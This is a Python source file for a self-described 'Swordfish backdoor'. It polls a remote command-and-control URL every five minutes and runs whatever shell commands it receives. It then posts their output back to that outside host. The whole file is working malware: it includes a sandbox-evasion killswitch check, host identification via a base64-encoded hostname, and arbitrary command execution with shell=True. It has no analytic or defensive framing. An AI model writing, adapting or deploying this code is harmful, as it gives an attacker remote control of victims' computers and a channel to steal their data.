import base64
import time
import json
import requests
import socket
import subprocess
import sys
import string
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


activate_killswitch = False

def killswitch():
    print("[DEBUG] Checking killswitch status...")
    if activate_killswitch:
        url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
        print(f"[DEBUG] Testing random URL: {url}")
        try:
            request_random = requests.get(url)
            print(f"[DEBUG] Random URL status code: {request_random.status_code}")
            if request_random.status_code == 200:
                print("[DEBUG] Killswitch triggered by random URL check.")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[DEBUG] Random URL request exception: {e}")
        try:
            request_google = requests.get("https://www.google.com")
            print(f"[DEBUG] Google request status code: {request_google.status_code}")
            if request_google.status_code == 200:
                print("[DEBUG] Killswitch not triggered by google check.")
                return False
            else:
                print("[DEBUG] Killswitch triggered by google check status.")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[DEBUG] Google request exception: {e}")
            print("[DEBUG] Killswitch triggered due to google request exception.")
            return True
    else:
        print("[DEBUG] Killswitch disabled.")
        return False

def get_host_id():
    hostname = socket.gethostname()
    encoded_id = base64.b64encode(hostname.encode()).decode()
    print(f"[DEBUG] Hostname: {hostname}")
    print(f"[DEBUG] Encoded Host ID: {encoded_id}")
    return hostname, encoded_id

def get_commands(c2_url, malware_key, host_id):
    payload = {
        "key": malware_key,
        "host_id": host_id
    }
    print(f"[DEBUG] Sending command request to C2 with payload: {payload}")
    try:
        response = requests.post(c2_url, json=payload, timeout=10, verify=False)
        print(f"[DEBUG] Response status code: {response.status_code}")
        if response.status_code == 200:
            json_resp = response.json()
            print(f"[DEBUG] Response JSON: {json_resp}")
            return json_resp.get("cmds", [])
        else:
            print(f"[DEBUG] Non-200 response received: {response.status_code}")
    except Exception as e:
        print(f"[DEBUG] Exception while getting commands: {e}")
    return []

def execute_commands(commands):
    results = []
    for cmd in commands:
        print(f"[DEBUG] Executing command: {cmd}")
        try:
            completed = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = completed.stdout + completed.stderr
            print(f"[DEBUG] Command output: {output}")
        except Exception as e:
            output = f"Error executing '{cmd}': {str(e)}"
            print(f"[DEBUG] {output}")
        results.append({
            "command": cmd,
            "output": output
        })
    return results

def send_results(c2_url, malware_key, host_id, hostname, results):
    payload = {
        "key": malware_key,
        "host_id": host_id,
        "hostname": hostname,
        "results": results
    }
    print(f"[DEBUG] Sending results to C2: {payload}")
    try:
        response = requests.post(c2_url, json=payload, timeout=10)
        print(f"[DEBUG] Results sent, status code: {response.status_code}")
    except Exception as e:
        print(f"[DEBUG] Exception while sending results: {e}")

def main():
    print("[DEBUG] Starting Swordfish backdoor main()")
    if killswitch():
        print("[DEBUG] Killswitch active, exiting.")
        sys.exit()

    hostname, host_id = get_host_id()

    while True:
        print("[DEBUG] Checking for commands...")
        cmds = get_commands("https://shoubadidou.requestcatcher.com/", "Looking-Sharp", host_id)
        if cmds:
            print(f"[DEBUG] Commands received: {cmds}")
            results = execute_commands(cmds)
            send_results("https://shoubadidou.requestcatcher.com/", "Looking-Sharp", host_id, hostname, results)
        else:
            print("[DEBUG] No commands received.")
        print("[DEBUG] Sleeping for 300 seconds...")
        time.sleep(300)  # toutes les 5 minutes

if __name__ == "__main__":
    main()
